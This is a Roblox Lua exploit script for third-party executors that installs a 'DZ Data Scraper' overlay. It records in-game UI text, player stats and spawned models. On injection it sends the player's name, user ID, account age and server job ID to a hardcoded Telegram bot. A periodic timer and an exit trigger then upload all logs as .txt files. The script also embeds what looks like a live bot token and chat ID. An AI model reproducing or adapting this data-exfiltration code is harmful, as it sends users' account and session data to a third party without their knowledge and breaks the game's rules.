local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ==========================================
-- TELEGRAM BOT CONFIGURATION
-- ==========================================
local BOT_TOKEN = "8626712218:AAE436iDEOfUNMgatN45CVii-fbA5SGl_-c"
local CHAT_ID = "7635022089"
local TELEGRAM_MSG_URL = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
local TELEGRAM_DOC_URL = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendDocument"

-- Find the executor's HTTP request function
local httprequest = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)

-- Global Log Database Storage
local CapturedLogs = {}
local eventCount = 0

-- ==========================================
-- TELEGRAM SENDING LOGIC (.TXT FILES)
-- ==========================================
local function sendDocumentToTelegram(fileContent, partNum, reason)
    if not httprequest then
        warn("Your executor does not support HTTP requests. Cannot send to Telegram.")
        return
    end

    local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    local filename = "ScrapeLog_" .. tostring(game.PlaceId) .. "_Part" .. tostring(partNum) .. ".txt"
    
    -- Constructing the multipart/form-data body payload
    local body = "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"
    body = body .. CHAT_ID .. "\r\n"
    
    body = body .. "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"
    body = body .. "📦 **DATA DUMP TRIGGERED: " .. reason .. "** (Part " .. tostring(partNum) .. ")\r\n"

    body = body .. "--" .. boundary .. "\r\n"
    body = body .. "Content-Disposition: form-data; name=\"document\"; filename=\"" .. filename .. "\"\r\n"
    body = body .. "Content-Type: text/plain\r\n\r\n"
    body = body .. fileContent .. "\r\n"
    body = body .. "--" .. boundary .. "--\r\n"

    local success, err = pcall(function()
        httprequest({
            Url = TELEGRAM_DOC_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
            },
            Body = body
        })
    end)

    if not success then
        warn("Failed to send TXT file to Telegram: " .. tostring(err))
    end
end

local function flushLogsToTelegram(reason)
    if #CapturedLogs == 0 then return end
    
    local maxLines = 1000
    local currentChunk = {}
    local partNum = 1
    
    for i, logLine in ipairs(CapturedLogs) do
        table.insert(currentChunk, logLine)
        
        -- If we hit 1000 lines OR we are at the very last line of the logs
        if #currentChunk >= maxLines or i == #CapturedLogs then
            local fileContent = table.concat(currentChunk, "\n")
            sendDocumentToTelegram(fileContent, partNum, reason)
            
            -- Reset for the next chunk
            currentChunk = {}
            partNum = partNum + 1
            task.wait(1.5) -- Wait between sending files to avoid Telegram rate limits
        end
    end
    
    -- Clear logs after sending so we don't send duplicates
    CapturedLogs = {} 
end

-- ==========================================
-- INITIAL GAME DATA SCRAPE (ALL INFO)
-- ==========================================
task.spawn(function()
    if not httprequest then return end

    local gameName = "Unknown Game"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    local initialInfo = string.format(
        "🚀 **SCRAPER INJECTED**\n\n" ..
        "🎮 **Game Name:** %s\n" ..
        "🆔 **Place ID:** %s\n" ..
        "🌐 **Job ID (Server):** %s\n" ..
        "👤 **Player:** %s (ID: %s)\n" ..
        "⏳ **Account Age:** %s days\n" ..
        "🕒 **Time Executed:** %s",
        gameName,
        tostring(game.PlaceId),
        tostring(game.JobId),
        player.Name,
        tostring(player.UserId),
        tostring(player.AccountAge),
        os.date("%X")
    )
    
    pcall(function()
        httprequest({
            Url = TELEGRAM_MSG_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({chat_id = CHAT_ID, text = initialInfo})
        })
    end)
end)


-- ==========================================
-- UI SETUP & ANIMATIONS
-- ==========================================
local gui = Instance.new("ScreenGui")
gui.Name = "DZDataScraperV1"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

local function tweenUI(obj, properties, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    local tween = TweenService:Create(obj, tweenInfo, properties)
    tween:Play()
    return tween
end

-- ==========================================
-- FLOATING ROUND MENU BUTTON
-- ==========================================
local openBtn = Instance.new("TextButton")
openBtn.Size = UDim2.new(0, 55, 0, 55)
openBtn.Position = UDim2.new(0, 15, 0, 15)
openBtn.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
openBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
openBtn.Text = "DZ"
openBtn.Font = Enum.Font.GothamBlack
openBtn.TextSize = 22
openBtn.Parent = gui

local openCorner = Instance.new("UICorner")
openCorner.CornerRadius = UDim.new(1, 0)
openCorner.Parent = openBtn

local openStroke = Instance.new("UIStroke")
openStroke.Color = Color3.fromRGB(0, 255, 150)
openStroke.Thickness = 2.5
openStroke.Parent = openBtn

-- Interactive Pulsing Outline Thread
task.spawn(function()
    while true do
        tweenUI(openStroke, {Thickness = 4}, 0.5).Completed:Wait()
        tweenUI(openStroke, {Thickness = 2.5}, 0.5).Completed:Wait()
    end
end)

local draggingBtn = false
local dragInput, mousePos, framePos

openBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingBtn = true
        mousePos = input.Position
        framePos = openBtn.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingBtn = false
            end
        end)
    end
end)

openBtn.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and draggingBtn then
        local delta = input.Position - mousePos
        openBtn.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
    end
end)

-- ==========================================
-- MAIN PANEL FRAME
-- ==========================================
local menuFrame = Instance.new("Frame")
menuFrame.Size = UDim2.new(0, 330, 0, 0)
menuFrame.Position = UDim2.new(0.5, -165, 0.5, -175)
menuFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
menuFrame.ClipsDescendants = true
menuFrame.Visible = false
menuFrame.Parent = gui

Instance.new("UICorner", menuFrame).CornerRadius = UDim.new(0, 14)
local menuStroke = Instance.new("UIStroke", menuFrame)
menuStroke.Color = Color3.fromRGB(0, 255, 150)
menuStroke.Thickness = 1.5

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 45)
title.BackgroundTransparency = 1
title.Text = "📡 LIVE DATA WATCHER 📡"
title.TextColor3 = Color3.fromRGB(0, 255, 150)
title.Font = Enum.Font.GothamBlack
title.TextSize = 16
title.Parent = menuFrame

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -110)
scrollFrame.Position = UDim2.new(0, 10, 0, 50)
scrollFrame.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
scrollFrame.ScrollBarThickness = 4
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = menuFrame

local listLayout = Instance.new("UIListLayout", scrollFrame)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 5)

local copyAllBtn = Instance.new("TextButton")
copyAllBtn.Size = UDim2.new(0.9, 0, 0, 40)
copyAllBtn.Position = UDim2.new(0.05, 0, 1, -50)
copyAllBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
copyAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyAllBtn.Text = "📤 FORCE SEND .TXT TO TELEGRAM"
copyAllBtn.Font = Enum.Font.GothamBlack
copyAllBtn.TextSize = 13
copyAllBtn.Parent = menuFrame
Instance.new("UICorner", copyAllBtn).CornerRadius = UDim.new(0, 8)

-- ==========================================
-- ENGINE DATA LOGGING CONTROLLER
-- ==========================================
local function appendLog(sourceName, extractedInfo)
    eventCount = eventCount + 1
    local timestamp = os.date("%X")
    local combinedString = string.format("[%s] (%s): %s", timestamp, sourceName, extractedInfo)
    
    table.insert(CapturedLogs, combinedString)

    local logRow = Instance.new("TextLabel")
    logRow.Size = UDim2.new(1, -5, 0, 22)
    logRow.BackgroundTransparency = 1
    logRow.Text = " " .. combinedString
    logRow.TextColor3 = Color3.fromRGB(220, 220, 240)
    logRow.TextSize = 11
    logRow.Font = Enum.Font.Code
    logRow.TextXAlignment = Enum.TextXAlignment.Left
    logRow.TextWrapped = true
    logRow.LayoutOrder = -eventCount
    logRow.Parent = scrollFrame
end

appendLog("SYSTEM", "Engine Initialized. Watching all networks...")

-- Manual Force Send Button
copyAllBtn.MouseButton1Click:Connect(function()
    if #CapturedLogs == 0 then
        copyAllBtn.Text = "❌ NO DATA CAPTURED YET"
        task.wait(1.5)
        copyAllBtn.Text = "📤 FORCE SEND .TXT TO TELEGRAM"
        return
    end

    flushLogsToTelegram("MANUAL FORCE SEND")
    
    copyAllBtn.Text = "✅ SENT FILE TO TELEGRAM!"
    copyAllBtn.BackgroundColor3 = Color3.fromRGB(0, 230, 120)
    task.wait(2)
    copyAllBtn.Text = "📤 FORCE SEND .TXT TO TELEGRAM"
    copyAllBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
end)

-- ==========================================
-- EVENT LISTENER THREAD HOOKS
-- ==========================================

-- Hook 1: Deep scan User Interface Text Changes
playerGui.DescendantAdded:Connect(function(element)
    if element:IsA("TextLabel") or element:IsA("TextButton") then
        task.wait(0.1) 
        if element.Text and #element.Text > 0 then
            appendLog("UI_SPAWN", element.Name .. " -> " .. element.Text)
        end
        element:GetPropertyChangedSignal("Text"):Connect(function()
            if element.Text and #element.Text > 0 then
                appendLog("UI_CHANGE", element.Name .. " updated to -> " .. element.Text)
            end
        end)
    end
end)

-- Hook 2: Deep scan Player Stat Values changes
local function scanStatsFolder(folder)
    for _, item in ipairs(folder:GetChildren()) do
        if item:IsA("ValueBase") then
            appendLog("STAT_TRACK", item.Name .. " starts at: " .. tostring(item.Value))
            item.Changed:Connect(function(newVal)
                appendLog("STAT_UPDATE", item.Name .. " shifted to -> " .. tostring(newVal))
            end)
        end
    end
end

if player:WaitForChild("leaderstats", 6) then
    scanStatsFolder(player.leaderstats)
end

player.ChildAdded:Connect(function(child)
    if child.Name == "leaderstats" or child:IsA("Folder") then
        task.wait(0.2)
        scanStatsFolder(child)
    end
end)

-- Hook 3: Workspace Activity
game.Workspace.ChildAdded:Connect(function(child)
    if child:IsA("Model") then
        appendLog("WORKSPACE_SPAWN", "Model spawned: " .. child.Name)
    end
end)

-- ==========================================
-- AUTO-SEND AND EXIT TRIGGERS (GUARANTEED DELIVERY)
-- ==========================================

-- 1. Periodic Auto-Save (Sends .txt file every 120 seconds)
task.spawn(function()
    while true do
        task.wait(120) 
        if #CapturedLogs > 0 then
            flushLogsToTelegram("AUTO-BACKUP (2 MIN TIMER)")
        end
    end
end)

-- 2. Exit Trigger (Fires right as you hit Leave Game)
Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        flushLogsToTelegram("PLAYER DISCONNECTED / LEFT GAME")
    end
end)

-- ==========================================
-- TOGGLE MAIN VIEW PANEL PORT
-- ==========================================
local menuOpen = false
openBtn.MouseButton1Click:Connect(function()
    if draggingBtn then return end 
    menuOpen = not menuOpen
    if menuOpen then
        menuFrame.Visible = true
        tweenUI(menuFrame, {Size = UDim2.new(0, 330, 0, 350)}, 0.3)
    else
        tweenUI(menuFrame, {Size = UDim2.new(0, 330, 0, 0)}, 0.3).Completed:Connect(function()
            if not menuOpen then menuFrame.Visible = false end
        end)
    end
end)
